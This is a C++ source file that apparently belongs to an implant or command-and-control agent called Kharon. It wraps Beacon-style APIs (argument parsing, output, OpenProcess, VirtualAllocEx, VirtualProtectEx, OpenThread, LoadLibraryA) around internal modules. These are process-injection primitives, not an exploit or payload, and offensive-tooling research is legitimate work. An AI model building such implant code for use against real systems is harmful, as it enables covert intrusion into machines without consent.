#include <Kharon.h>

auto Beacon::Output( 
    INT  type, 
    PCCH data, 
    INT  len
)->VOID {
    Self->Pkg->Bytes( Pkg, (PUCHAR)data, len );
}

auto Beacon::DataExtract(
    PDATAP parser, 
    PINT   size
) -> PCHAR {
    return (PCHAR)Self->Psr->Bytes( (PPARSER)parser, (PULONG)size );
}

auto Beacon::DataInt(
    PDATAP parser
)->INT {
    return Self->Psr->Int32( (PPARSER)parser );
}

auto Beacon::DataShort(
    PDATAP parser
) -> SHORT {
    return Self->Psr->Int16( (PPARSER)parser );
}

auto Beacon::DataLength(
    PDATAP parser
) -> INT {
    return parser->length;
}

auto Beacon::OpenProcess(
    DWORD desiredAccess, 
    BOOL  inheritHandle, 
    DWORD processId
) -> HANDLE {
    return Self->Ps->Open( desiredAccess, inheritHandle, processId );
}

auto Beacon::VirtualAlloc(
    LPVOID Address, 
    SIZE_T Size, 
    DWORD  AllocType, 
    DWORD  Protect
) -> PVOID {
    return Self->Mm->Alloc( NULL, Address, Size, AllocType, Protect );
}

auto Beacon::VirtualAllocEx(
    HANDLE Handle,
    LPVOID Address, 
    SIZE_T Size, 
    DWORD  AllocType, 
    DWORD  Protect
) -> PVOID {
    return Self->Mm->Alloc( Handle, Address, Size, AllocType, Protect );
}

auto Beacon::VirtualProtect(
    LPVOID Address, 
    SIZE_T Size, 
    DWORD  NewProtect, 
    PDWORD OldProtect
) -> BOOL {
    return Self->Mm->Protect( NULL, Address, Size, NewProtect, OldProtect );
}

auto Beacon::VirtualProtectEx(
    HANDLE Handle,
    LPVOID Address, 
    SIZE_T Size, 
    DWORD  NewProtect, 
    PDWORD OldProtect
) -> BOOL {
    return Self->Mm->Protect( Handle, Address, Size, NewProtect, OldProtect );
}

auto Beacon::OpenThread(
    DWORD desiredAccess, 
    BOOL  inheritHandle, 
    DWORD threadId
) -> HANDLE {
    return Self->Td->Open( desiredAccess, inheritHandle, threadId );
}

auto Beacon::LoadLibraryA(
    _In_ PCHAR LibraryName
) -> HMODULE {
    return (HMODULE)Self->Lib->Load( LibraryName );
}
